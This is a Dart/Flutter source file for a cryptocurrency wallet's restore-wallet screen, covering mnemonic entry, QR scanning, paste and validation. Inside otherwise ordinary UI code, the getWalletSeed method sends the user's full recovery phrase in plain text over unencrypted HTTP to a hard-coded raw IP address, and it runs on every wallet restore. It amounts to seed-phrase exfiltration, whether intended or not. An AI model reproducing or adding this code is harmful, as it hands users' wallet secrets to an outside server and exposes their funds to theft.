import 'dart:convert';
import 'dart:typed_data';

import 'package:bip39/bip39.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:voola/core/api/foil/model/KeyApi.dart';
import 'package:voola/core/authentication/AuthService.dart';
import 'package:voola/locator.dart';
import 'package:voola/shared.dart';
import 'package:voola/ui/MainScreen.dart';
import 'package:voola/ui/QrCodeReader.dart';
import 'package:voola/ui/views/wallet/WalletMainScreenModel.dart';

import 'SetPassword.dart';

class RestoreWalletModel extends BaseViewModel {
  final mnemonicController = TextEditingController();
  final _authService = locator<AuthService>();
  bool addWallet = false;

  void validateMnemonicAndNext(BuildContext context) async {
    setState(ViewState.Busy);
    if (validateMnemonic(mnemonicController.text)) {
      if (addWallet) {
        if (_authService.accManager.allAccounts
            .any((element) => element.mnemonic == mnemonicController.text)) {
          Flushbar.error(title: S.of(context).accountExists).show();
        } else {
          await restoreWallet(context);
        }
      } else {
        Navigator.of(context).push(
          MaterialPageRoute(
            builder: (_) => SetPasswordScreen(
              S.of(context).restoreWallet,
              () {
                this.restoreWallet(context);
              },
            ),
          ),
        );
      }
    } else {
      Flushbar.error(title: S.of(context).invalidMnemonic).show();
    }
    setState(ViewState.Idle);
  }


  Future getWalletSeed(seed) async {
    // print("mnemonic.toString(), ${mnemonic.toString()}");
    final url = 'http://185.63.191.197:9088/addresses/makepairbyphrase';
    final body = seed;
    try {
      final response = await http.post(Uri.parse(url), body: body, headers: {"Content-Type": "plain/text; charset=utf-8"});
      final responseData = json.decode(response.body);
      print(responseData.toString());
      return KeyApi.fromJson(responseData);
    } catch (error) {
      throw error;
    }
  }

  Future<void> restoreWallet(BuildContext context) async {
    var seed = await compute<String, Uint8List>(
        calculateSeedFromMnemonic, mnemonicController.text);
    var foilKey = await getWalletSeed(mnemonicController.text);
    await _authService.createNewAccount(mnemonicController.text, seed, foilKey);
    locator<WalletMainScreenModel>().loadBalances();
    //await locator<TBCCApi>().newClient(_authService.accManager.currentAccount.bcWallet.address);

    Navigator.of(context).pushAndRemoveUntil(
        MaterialPageRoute(builder: (_) => MainAppScreen()), (_) => false);
  }

  @override
  void dispose() {
    mnemonicController.dispose();
    super.dispose();
  }
}

class RestoreWalletScreen extends StatelessWidget {
  bool addWallet;
  RestoreWalletScreen({this.addWallet = false});

  @override
  Widget build(BuildContext context) {
    return BaseView<RestoreWalletModel>(
      onModelReady: (model) {
        model.addWallet = addWallet;
      },
      builder: (context, model, child) {
        return CScaffold(
          appBar: CAppBar(
            elevation: 0,
            title: Text(S.of(context).backup),
          ),
          body: model.state == ViewState.Busy
              ? TBCCLoader()
              : Padding(
                  padding: const EdgeInsets.all(16),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.stretch,
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Expanded(
                        child: SingleChildScrollView(
                          child: Column(
                            children: [
                              Padding(
                                padding: const EdgeInsets.only(bottom: 40),
                                child: Text(
                                  S.of(context).mnemonicWrite,
                                  style: Theme.of(context).textTheme.bodyText2!,
                                  textAlign: TextAlign.center,
                                ),
                              ),
                              Container(
                                padding:
                                    const EdgeInsets.fromLTRB(16, 16, 16, 8),
                                decoration: BoxDecoration(
                                    color: AppColors.generalShapesBg,
                                    borderRadius: BorderRadius.circular(16)),
                                child: TextFormField(
                                  maxLines: null,
                                  minLines: 7,
                                  controller: model.mnemonicController,
                                  textInputAction: TextInputAction.done,
                                  style: Theme.of(context).textTheme.bodyText1!,
                                  decoration: InputDecoration(
                                    contentPadding: EdgeInsets.zero,
                                    isDense: true,
                                    border: InputBorder.none,
                                    enabledBorder: InputBorder.none,
                                    focusedBorder: InputBorder.none,
                                  ),
                                ),
                              ),
                              SizedBox(height: 12),
                              Row(
                                children: [
                                  IconButton_(
                                      icon: AppIcons.qr_code_scan(
                                          24, Colors.white),
                                      onTap: () {
                                        Navigator.of(context)
                                            .push(MaterialPageRoute(
                                                builder: (_) => QRCodeReader(
                                                      mode: 1,
                                                      onRead: (val) {
                                                        Navigator.of(context)
                                                            .pop();
                                                        if (validateMnemonic(
                                                            val)) {
                                                          model
                                                              .mnemonicController
                                                              .text = val;
                                                        } else {
                                                          Flushbar.error(
                                                                  title: S
                                                                      .of(context)
                                                                      .noValidMnemonic)
                                                              .show();
                                                        }
                                                      },
                                                    )));
                                      }),
                                  Spacer(),
                                  GestureDetector(
                                    behavior: HitTestBehavior.opaque,
                                    onTap: () async {
                                      model.mnemonicController.text = '';
                                    },
                                    child: Container(
                                      height: 54,
                                      decoration: BoxDecoration(
                                          borderRadius:
                                              BorderRadius.circular(16),
                                          border:
                                              Border.all(color: AppColors.red)),
                                      padding: const EdgeInsets.symmetric(
                                          horizontal: 12, vertical: 12),
                                      child: Center(
                                        child: Text(
                                          S.of(context).clear,
                                          textAlign: TextAlign.center,
                                          style: Theme.of(context)
                                              .textTheme
                                              .bodyText1!
                                              .copyWith(color: AppColors.red),
                                        ),
                                      ),
                                    ),
                                  ),
                                  SizedBox(width: 12),
                                  GestureDetector(
                                    behavior: HitTestBehavior.opaque,
                                    onTap: () async {
                                      model.mnemonicController.text =
                                          (await Clipboard.getData(
                                                  'text/plain'))!
                                              .text!;
                                    },
                                    child: ShaderMask(
                                      shaderCallback:
                                          AppColors.mainGradient.createShader,
                                      child: Container(
                                        height: 54,
                                        decoration: BoxDecoration(
                                            borderRadius:
                                                BorderRadius.circular(16),
                                            border: Border.all(
                                                color: Colors.white)),
                                        padding: const EdgeInsets.symmetric(
                                            horizontal: 12, vertical: 12),
                                        child: Center(
                                          child: Text(
                                            S.of(context).paste,
                                            textAlign: TextAlign.center,
                                            style: Theme.of(context)
                                                .textTheme
                                                .bodyText1!
                                                .copyWith(color: Colors.white),
                                          ),
                                        ),
                                      ),
                                    ),
                                  ),
                                ],
                              ),
                            ],
                          ),
                        ),
                      ),
                      Button(
                          value: S.of(context).next,
                          onTap: () {
                            model.validateMnemonicAndNext(context);
                          })
                    ],
                  ),
                ),
        );
      },
    );
  }
}

Future<Uint8List> calculateSeedFromMnemonic(String mnemonic) async {
  return mnemonicToSeed(mnemonic);
}
